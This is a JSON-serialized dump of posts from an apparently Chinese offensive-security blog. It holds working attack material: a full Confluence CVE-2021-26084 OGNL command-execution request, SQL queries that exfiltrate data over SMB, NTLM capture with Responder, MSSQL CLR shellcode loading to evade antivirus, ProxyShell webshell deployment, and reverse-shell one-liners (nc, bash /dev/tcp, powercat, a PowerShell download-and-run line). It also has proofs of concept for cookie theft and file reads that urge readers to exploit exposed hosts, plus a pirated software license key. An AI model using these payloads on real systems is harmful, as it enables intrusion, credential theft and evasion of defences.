Net.WebClient).DownloadString('https://x.x.x.x/Lock-WorkStation.ps1');\u0026quot;\r 重新读取，可读到明文密码。\n参考地址： https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html\rhttps://www.jianshu.com/p/7ccf6e15fbe0\rhttps://blog.thekingofduck.com/post/Dumping-Windows-Local-Credentials-Tools/\r ","id":39,"section":"posts","summary":"0×00 前言 市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提","tags":["内网渗透","凭据窃取"],"title":"windows抓取hash总结","uri":"https://ad-calcium.github.io/2021/09/windows%E6%8A%93%E5%8F%96hash%E6%80%BB%E7%BB%93/","year":"2021"},{"content":"0x01 漏洞介绍 Confluence Server Webwork OGNL 注入漏洞（CVE-2021-26084），远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码。\n0x02 影响范围 受影响版本\n Confluence \u0026lt; 6.13.23 6.14.0 ≤ Confluence \u0026lt; 7.4.11 7.5.0 ≤ Confluence \u0026lt; 7.11.6 7.12.0 ≤ Confluence \u0026lt; 7.12.5 Confluence \u0026lt; 7.13.0  0x03 利用工具 https://github.com/h3v0x/CVE-2021-26084_Confluence\r 0x03 漏洞复现 漏洞payload\nPOST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1\rHost: xxxxxxx\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\rCookie: JSESSIONID=4FBEAB3342C1B2F544CB4AA67A7ADA6F\rConnection: close\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 1072\rqueryString=aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022whoami%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027\r ","id":40,"section":"posts","summary":"0x01 漏洞介绍 Confluence Server Webwork OGNL 注入漏洞（CVE-2021-26084），远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式","tags":["漏洞复现","Confluence "],"title":"CVE-2021-26084(Confluence) 漏洞复现","uri":"https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"前言 温故而知新，今天在整理古老的近乎失传的DNS外带注入方法时，偶然间发现外带数据的装载区域并不一定是 域名前缀。放在后面也是可以的，由于目前网络上没有相关的记载，姑且称之为SMB外带注入吧。\r 1.搭建测试环境 系统:centos7\n首先安装smb服务\nyum install samba -y\r 修改配置文件: vim /etc/samba/smb.conf\n[global]\rmap to guest = Bad User\rserver role = standalone server\rusershare allow guests = yes\ridmap config * : backend = tdb\rsmb ports = 445\rlog level = 10\r[share]\rcomment = share\rpath = /tmp\rguest ok = yes\rwritable =yes\rbrowsable = yes\r#force user = smbuser\r 保存配置文件, 重启smb服务\nsystemctl restart smb.service\r 在windows环境的机器，上面安装MySQL ，建议安装 MySQL 5.7.16 以下版本，主要是由于高版本有一个默认选项secure_file_priv ，默认不允许load_file 。 如果安装的数据库版本\u0026gt;=MySQL 5.7.16 在my.ini文件中将secure_file_priv设置为空, 修改完成后, 记得重启mysql服务\nshow global variables like '%secure%';\r smb外带注入与DNS外带注入比较:\nsmb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。\rsmb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。\r 构造sql语句：\nselect load_file(concat(\u0026quot;\\\\\\\\\u0026lt;IP\u0026gt;\\\\\u0026quot;,(SQL语句),\u0026quot;\\\\xxx\u0026quot;))\r为了方便从log里提取查询的内容，可以构造如下语句\rselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\share[\u0026quot;,database(),\u0026quot;]\\\\1.txt\u0026quot;));\r 我们在MySQL服务器上执行这样一条SQL语句：\nselect load_file('\\\\\\\\10.99.99.234\\\\share\\\\1.txt');\r在samba服务器上查看到了这样一条日志：\r[2021/07/03 03:27:45.437996, 10, pid=9939, effective(0, 0), real(0, 0)] ../../source3/lib/util_event.c:54(smbd_idle_event_handler)\r 获取当前数据库名\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\share[\u0026quot;,database(),\u0026quot;]\\\\1.txt\u0026quot;));\r 查看smb日志\n tail -f /var/log/samba/log.smbd | grep \u0026quot;failed to find service\u0026quot;\r 查询当前数据库里的表\n1. 使用limit\r2. substring截断\r 使用limit请先获取总共的表数\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select count(table_name) from information_schema.tables where table_schema=database()),\u0026quot;]\\\\1.txt\u0026quot;));\r 再用limit逐个查询\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),\u0026quot;]\\\\1.txt\u0026quot;));\r 验证第test库中的第一个表名是否为aggregate_graph_templates substring截断 截断到120字符串即可\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),\u0026quot;]\\\\1.txt\u0026quot;));\r 另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破 NTLM-relay攻击参考: https://www.cnblogs.com/car7n/p/14887818.html\nselect load_file('\\\\\\\\10.99.99.245\\\\x');\r kali运行responder\nresponder -I eth0 -f 10.99.99.41\r用法: -I表示指定的网卡，-f表示允许攻击者查看受害者的主机指纹。\r 参考地址: https://422926799.github.io/posts/af61cc76.html http://moonslow.com/article/smb_sql_injection\n","id":41,"section":"posts","summary":"前言 温故而知新，今天在整理古老的近乎失传的DNS外带注入方法时，偶然间发现外带数据的装载区域并不一定是 域名前缀。放在后面也是可以的，由于目前","tags":["小技巧","web安全"],"title":"SMB外带注入","uri":"https://ad-calcium.github.io/2021/09/smb%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5/","year":"2021"},{"content":"0x01 前言 使用SQL Server提权的时候，发现各种组件都被拦截，无法绕过360执行系统命令，查询资料发现使用SQL Server CLR可以加载shellcode，从而绕过360执行系统命令。\n0x02 利用工具 SharpSQLTools https://github.com/uknowsec/SharpSQLTools\r 0x03 复现过程 1.使用cs生成木马 2.加密shell.bin python3 Encrypt.py -f shell.bin -k loader\r 3.启用MSSQL CLR功能 SharpSQLTools.exe 10.108.3.153 sa 123456 master enable_clr\r 4.使用文件16进制流创建CLR SharpSQLTools.exe 10.108.3.153 sa 123456 master install_clr\r 5.上传 payload.txt至可写目录 在执行copy命令合并文件时会被360拦截，但是文件已经被分割上传上去了。\nSharpSQLTools.exe 10.108.3.153 sa 123456 master upload payload.txt C:\\Users\\Public\\payload.txt\r 使用clr_combine去合并文件\nSharpSQLTools.exe 10.108.3.153 sa 123456 master clr_combine C:\\Users\\Public\\payload.txt\r 6.利用clr_scloader1加载进内存 SharpSQLTools中实现的clr_shellcode_loader使用APC注入技术，将shellcode解密后注入了一个新起的werFault.exe的进程中\nSharpSQLTools.exe 10.108.3.153 sa 123456 master clr_scloader1 C:\\Users\\Public\\payload.txt loader\r cs成功上线\n7.进程链bypass 当我们在cs上执行系统命令的操作时会被拦截，360对父进程是sqlservr.exe的进程链拦截得特别厉害。黑名单连：sqlserver.exe\u0026ndash;\u0026gt;cmd.exe\n360拦截的死死的\n注入其他进程来绕过sqlservr.exe的进程链防护。\n注入进程\ninject ppid arch\r 再次执行命令，发现已经不拦截了\n","id":42,"section":"posts","summary":"0x01 前言 使用SQL Server提权的时候，发现各种组件都被拦截，无法绕过360执行系统命令，查询资料发现使用SQL Server CLR可以加载shellc","tags":["MSSQL","MSSQL提权"],"title":"mssql提权之使用clr bypass360","uri":"https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/","year":"2021"},{"content":"要求 Exchange 2019 目录服务器要求 域控制器：林中的所有域控制器都需要运行 Windows Server 2012 R2 Standard 或 Datacenter版本以上\nActive Directory 林的功能级别：Windows Server 2012 R2 或更高版本。\nExchange 2019支持的操作系统： 邮箱和边缘传输服务器角色：Windows Server 2019 Standard 或 Datacenter\n管理工具：Windows Server 2019 Standard或Datacenter和64位版本的 Windows 10\n安装 1.新增exchange用户 在域控上将exchange用户加入到Enterprise admins组中\n2.安装常用组件   切换域管理员或拥有Exchange管理权限的用户登录并安装必备组件（此次实验环境用域管理员登录）\n .NET Framework 4.8 Visual C++ Redistributable Package for Visual Studio 2012 Visual C++ Redistributable Package for Visual Studio 2013 Unified Communications Managed API 4.0 通过Power Shell安装Exchange必备的Windows组件    通过Power Shell安装Exchange必备的Windows组件\nInstall-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS\r   3.安装主程序  挂载Exchange 2019 光盘文件，并运行Setup.exe 程序   为节约时间选择“现在不检查更新”后续可以自己更新   文件复制完成后便开始进入向导安装。   选择“不使用推荐设置”   在服务器角色选择页面勾选邮箱角色 。从exchange 2016 起，exchange 将2013中的客户端访问角色和邮箱角色合并为邮箱角色。    指定exchange组织的名称\n  恶意软件防护设置，按需选择，比较弱鸡，外层有邮件网关的可以不开启。\n   分析先决条件，没有错误即可开始安装   开始安装，整个过程共14步，安装速度与机器配置有关，请耐心等待。   等待安装完成，访问owa页面可以正常打开，安装到此结束。  https://127.0.0.1/owa/\r 用户和组管理 方法一：先创建域用户，再把现有用户创建为邮箱。\n根据要求一步步新建用户，用户创建好之后\n使用管理员身份登录exchange ECP管理中心(一般情况下是exchange机器的用户密码)：https://127.0.0.1/ecp/ 选择收件人\u0026gt;邮箱\u0026gt;➕\u0026gt;\n用户邮箱 打开创建邮箱向导。\n勾选现有用户，点击浏览按钮即可选择域控中的用户保存之后既可以看到用户\n在邮箱处可以看到刚刚添加的 邮箱\n方法二：通过ECP后台直接创建邮箱和域账号。\n点击添加\n选择用户时改为选择新用户填入用户资料即可，其他步骤都一样。\n参考地址：\nhttps://www.xiaobei.us/archives/775.html\n","id":43,"section":"posts","summary":"要求 Exchange 2019 目录服务器要求 域控制器：林中的所有域控制器都需要运行 Windows Server 2012 R2 Standard 或 Datacenter版本以上 Active Directory 林的功能级别：Windows Server 2012 R2 或","tags":["内网环境搭建"],"title":"exchange2019安装教程","uri":"https://ad-calcium.github.io/2021/08/exchange2019%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/","year":"2021"},{"content":"0x01 漏洞介绍 国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验证代码)、EXP（漏洞利用代码）及利用视频。漏洞包括Exchange ACL绕过漏洞CVE-2021-34473、Exchange权限提升漏洞CVE-2021-34523和Exchange授权任意文件写入漏洞CVE-2021-31207）。\n攻击者可通过组合使用上述漏洞在未经身份验证的情况下远程接管目标服务器。由于Exchange服务器一般承载着使用者单位人员信息的秘密，员工账号信息、邮件数据都在其中，一旦Exchange服务器被控制，将会造成严重后果。\n由于国外安全研究人员将Exchange多个漏洞（ProxyShell）细节及部分PoC、EXP公开，意味着攻击者可根据这些技术细节披露的信息，在目标系统远程执行代码，使漏洞风险明显上升。\n0x02 漏洞利用前提 获取exchange的用户名\n0x03 受影响的版本  Microsoft Exchange Server 2019 Cumulative Update 9 Microsoft Exchange Server 2013 Cumulative Update 23 Microsoft Exchange Server 2019 Cumulative Update 8 Microsoft Exchange Server 2016 Cumulative Update 19 Microsoft Exchange Server 2016 Cumulative Update 20  0x04 工具 生成webshell：https://github.com/Ridter/proxyshell_payload\r漏洞利用：https://github.com/dmaasland/proxyshell-poc\r 0x05 漏洞复现环境    名称 系统 软件版本     域控 windows server 2012    邮件服务 windows server 2019 exchange2019    0x06 漏洞复现 1.根据需求，生成webshell 根据自己需要，生成webshell数据，替换到proxyshell-poc中，执行，获取webshell。默认情况下，生成的是一句话木马\n在proxyshell_payload.py中，修改末尾的webshell变量，将其替换为哥斯拉生成的aspx的webshell,需要注意的是经过测试CSharpDynamicPayload中的CSHAP_AES_BASE64,生成的webshell,需要将其中所有的Session替换成Application.\n运行proxyshell_payload.py，将encode之后的内容，复制到proxyshell_rce.py的 311 行：\n2.运行exp获取webshell 运行proxyshell_rce.py，首先获取exchange的powershell 管理shell\npython3 proxyshell_rce.py -u https://10.108.3.140 -e exxx@xxx.com\r用法\r-u exchange地址\r-e exchange的用户名\r 清理邮件导出请求(如果报错，多执行几次脚本即可)\nGet-MailboxExportRequest\rGet-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false\r 执行dropshell，即可写入webshelldropshell\n3.连接webshell 使用菜刀连接shell\n查看权限\nProxyshell_rce可以根据自己的需要修改生成shell的路径，只需要修改222行和 233行的两行内容，将其对应。\n默认上传路径：C:\\inetpub\\wwwroot\\aspnet_client\n参考地址：\nhttps://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw\r ","id":44,"section":"posts","summary":"0x01 漏洞介绍 国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验","tags":["exchange系列"],"title":"ProxyShell漏洞复现","uri":"https://ad-calcium.github.io/2021/08/exchange-proxyshell%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞介绍 天融信-上网行为管理系统存在弱口令漏洞并存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的铭感文件。\n0x02 漏洞复现 fofa语法\napp=\u0026quot;天融信-上网行为管理系统\u0026quot;\r fofa上看了一波，还是有很多资产的\n弱口令：guest/guest*PWD\nPOC:https://xxxxxxx/view/action/download_file.php?filename=/root/.bash_history\u0026amp;savename=\r ","id":45,"section":"posts","summary":"0x01 漏洞介绍 天融信-上网行为管理系统存在弱口令漏洞并存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的铭感文件。 0x02 漏洞复现 fofa语法 ap","tags":["漏洞复现","web渗透"],"title":"天融信上网行为管理系统存在任意文件读取漏洞","uri":"https://ad-calcium.github.io/2021/07/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 漏洞描述 jdc用于对接青龙面板 2.0使用，用于自助扫码功能，由于开发者未对checkcookie进行鉴权，导致攻击者通过该漏洞获取全部cookie，造成用户信息泄露等。\n0x02 漏洞复现 poc：http://IP:5678/checkcookie\r 获取到jd的cookie，怎么用大家都懂。\n撸了个脚本,跑了一下大概还有几十个漏洞，懂得小伙伴可以去梭哈一波。\n","id":46,"section":"posts","summary":"0x01 漏洞描述 jdc用于对接青龙面板 2.0使用，用于自助扫码功能，由于开发者未对checkcookie进行鉴权，导致攻击者通过该漏洞获取全部co","tags":["漏洞复现","web安全"],"title":"jdc未授权访问","uri":"https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/","year":"2021"},{"content":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等\n主要隧道有：\nICMP TCP UDP SSH HTTP DNS SOCKS\r 内网穿透原理 内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。\n什么是隧道技术呢？我们看一下百科词条的解释\n 隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。\n 我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。\n这些隧道技术可以按所处的协议层分层。\n  网络层隧道\n ICMP隧道等\n   传输层隧道\n TCP隧道、UDP隧道\n   应用层隧道\n HTTP、DNS、SSH等隧道\n   内网主机所有可能的出网方式\n  允许ICMP协议出网\n 网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网\n   允许特定的TCP或UDP协议端口出网\n 网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致。比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行；比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口\n   允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）\n 这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议;通常办公网是允许HTTP协议出网的，可能会域名白名单限制 内网主机所有可能的入网方式\n   允许ICMP协议入网\n 能ping通目标主机\n   允许特定的TCP或UDP协议端口入网\n NAT端口映射公网IP端口到内网主机的服务端口，比如将web服务、mysql服务NAT映射到公网\n   允许特定的应用层协议入网\n 这种网络防火墙能识别应用层的协议，放行允许入网的协议。比如HTTP反向代理，将公网收到的HTTP流量反向代理进内网主机。当前主流的入网方式，通常会加层WAF审查入网流量\n   0x01 首先判断出网协议 icmp协议： ping www.baidu.com\r TCP协议： curl www.baidu.com\rnc IP\r HTTP协议： curl ip:port\rcurl www.baidu.com:80\r DNS协议： Nslookup www.baidu.com\rDig www.baidu.com\r 0x02理论知识 正向代理 正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）\r 反向代理 反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器\r 0x03常用工具 https://www.proxifier.com/\rhttps://github.com/fatedier/frp\rhttps://github.com/ehang-io/nps\rhttps://github.com/L-codes/Neo-reGeorg\rproxifier注册码\r用户名：zxhi\r注册码：LYZGL-F2KX3-JW5W4-A33MC-25QHH\r 0x04 各种协议隧道 一、Socks代理 1. FRP隧道 1.1. 反向代理 目的：\n1.需要通过公网服务器代理连接内网机器\r2.需要通过代理使得本机外网地址变为该内网机器外网IP\r 拓扑图\n1、配置靶机上配置frps. ini #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\r 2、首先在公网上配置服务端(frpc.ini) #frpc.ini\n[common]\r# 填写攻击机的地址\rserver_addr = 0.0.0.0\rserver_port = 7000\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 3、配置proxifier 配置ip、端口、连接方式、账号密码\n配置通过该代理的IP Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP通过，防止流量过大）\n尝试访问内网地址\n1.2.多层socks代理 实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中\n具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)\n1、VPS配置frps.ini #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\r 配置好之后运行\nfrps.exe -c frps.ini\r 2、内网B主机的frps.ini设置： [common]\r#填写ip当前主机的ip地址\rbind_addr = 192.168.100.40\rbind_port = 7000\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 3、内网C主机的frpc.ini设置 frpc.ini\n[common]\r#填写跳板的地址，这里填写的是主机website主机的iP地址\rserver_addr = 192.168.100.40\rserver_port = 7000\r[plugin_socks5]\rtype = tcp\rremote_port = 7777\rplugin = socks5\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 4、内网B主机的frpc.ini设置： #frpc.ini\n[common]\r# 填写自己的服务器IP\rserver_addr = 10.108.3.58\rserver_port = 7000\r[pandan]\rtype = tcp\rlocal_ip= 192.168.100.40\rremote_port = 7777\rlocal_port = 7777\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 思路分析：\n两个启动以后，其实已经可以直接通过使用B主机ip+端口直接使用搭建在C主机的socks代理，但是此时是无法直接访问B主机的，但是B主机出网，所以可以通过将刚刚C连接B的7891端口映射到vps上，通过连接vps+端口使用C主机的socks代理\n5、测试socks代理是否搭建成功： 访问主机B的web服务(192.168.1.50)\n访问主机C的web服务(192.168.2.200)\n说明代理没问题\n2.EW 常用参数 -l 指定要监听的本地端口 -d 指定要反弹到的机器 ip -e 指定要反弹到的机器端口 -f 指定要主动连接的机器 ip -g 指定要主动连接的机器端口 -t 指定超时时长,默认为 1000\n2.1 正向代理 正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。\new -s ssocksd -l 10899\r 使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可\n2.2、反向代理 攻击机：\new -s rcsocks -l 1081 -e 1080\r将靶机中的1080端口流量代理到本地的1081端口上\r 靶机\new -s rssocks -d 攻击机IP -e 1080\r 2.3、多层代理 获得目标网络内两台主机 A、B 的权限，情况描述如下：\rA 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。\rB 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。\rA 主机可直连 B 主机\r一台可控公网IP主机 可控内网主机A 内网主机C\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r|HackTools| -\u0026gt;\u0026gt; | 9999 -\u0026gt; 10.108.3.58 -\u0026gt; 8888 | 防火墙 | \u0026lt;-- 192.168.1.50 --\u0026gt; | -\u0026gt;\u0026gt; | 9999 --\u0026gt; 192.168.2.200 |\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r 在VPS( 10.108.3.58 )公网主机添加转接隧道，将 9999收到的代理请求，转交给反连 8888 端口的主机\new -s lcx_listen -l 9999 -e 8888\r 在内网主机A(192.168.2.200)上利用 ssocksd 方式启动 7777端口的 socks 代理\new -s ssocksd -l 777\r 在 192.168.1.50 上，通过工具的 lcx_slave 方式，打通10.108.3.58:9999 和 192.168.2.200:7777之间的通讯隧道\new -s lcx_slave -d 10.108.3.58 -e 8888 -f 192.168.1.200 -g 7777\r 验证\n3.NPS NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。\n3.1 反向代理 配置nps 在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改conf/nps.conf即可：\n需要改一下#web下面的几个参数，\nweb_host= 服务器IP或者域名\rweb_username= admin（登录用户名）\rweb_password= 你的密码\rweb_port=8080（web管理端口）\r 修改#bridge 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。\n##bridge\rbridge_type=tcp\rbridge_port=443 # 修改连接端口\rbridge_ip=0.0.0.0\r 启动server 访问WEB管理页面（默认web界面端口是8080，默认密码为admin/123 ，可以在配置文件里修改默认端口和账号密码）\n新增客户端 设置客户端验证秘钥：\n配置客户端 上传客户端文件至C，解压后在CMD运行命令：\nnpc.exe -server=10.108.3.147:8024 -vkey=123456 -type=tcp\r 在web管理页面可以看到C主机已上线：\n配置Socks5代理 现在A仍然无法访问内网的C主机，需要使用Socks5客户端软件把流量带出来。\n注意：一定要等客户端上线以后在配置Socks代理。\n新增成功后的页面：\n测试 配置Proxifier\n测试成功\n官方文档：https://ehang-io.github.io/nps/#/?id=nps\n二、传输层 2.1. nc nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下\n简单互相传输功能：\nvps：nc -lp 5555 目标机器：Nc -vn vpsip 5555\r 文件传输功能：\nvps：nc -lp 5555 \u0026gt;1.txt\r目标机器：Nc -vn vpsip \u0026lt; xx.txt\r shell的反弹：\n正向连接：\rnc -lvp 4444 -e /bin/sh\rnc 192.168.1.1 4444\r反向连接：\rnc -lvp 4444\rnc 192.168.1.1 4444 -e /bin/sh\r 注意：windows版本CMD位置C:\\windows\\system32\\cmd.exe\nBash反向shell\nnc -lvp 4444\rBash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.1/4444 0\u0026gt;\u0026amp;1\r 2.2 Powercat（powershell版的nc） 正向和反向连接：\rpowercat -l -p 8080 -e cmd.exe -v nc 192.168.1.1 8080 -vv\rnc -l -p 8080 -vv\rpowercat -c 192.169.1.1 -p 8080 -e cmd.exe -v\r 可以反弹powershell\n-eq  文件上传\n这个不用说，基本这种连接的都支持\n在c:下新建一个test.txt的文件，写入数据\n在有text.txt的机器执行:\npowercat -c 192.168.12.108 -p 9999 -i c:test.txt -v\r 另一台机器执行\npowercat -l -p 9999 -of c:test.txt -v\r 3.lcx端口转发 windows\rvps: lcx -listen 2222 3333 //2222为转发端口，3333为本机任意未被占用的端口\r肉鸡：lcx -slave vps_ip 2222 127.0.0.1 3389 //将本地3389端口转发至vps_ip 2222端口\r3389连接时格式 vps:3333\rlinux\rvps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777\r肉鸡：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666\r将内网主机22端口的流量转发到公网主机的6666端口\r 5.neo-reGeorg VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)\npython neoreg.py generate -k \u0026lt;you_password\u0026gt; --file 404.html\r 将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。\nVPS上运行\npython neoreg.py -k \u0026lt;you_password\u0026gt; -u \u0026lt;server_url\u0026gt; --proxy socks5://10.1.1.1:8080（本地代理地址）\r Socks连接工具连接本地127.0.0.1:1080\n三、应用层 3.1 SSH转发 一个正常的SSH命令\n ssh root@192.168.1.1\r SSH 本地转发机制 拓扑：VPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB双网卡192.168.1.1和10.1.1.1段\n本地转发机制：\n选项：\n-C 压缩传输\r-f 后台启用\r-N 不打开远程shell，处于等待状态\r-g 允许本地转发端口\r 使用方法：\n在VPS上运行\n用法：ssh -CfNg -L \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH 边界机\u0026gt;\rssh -CfNg -l 5555:10.1.1.1:3389 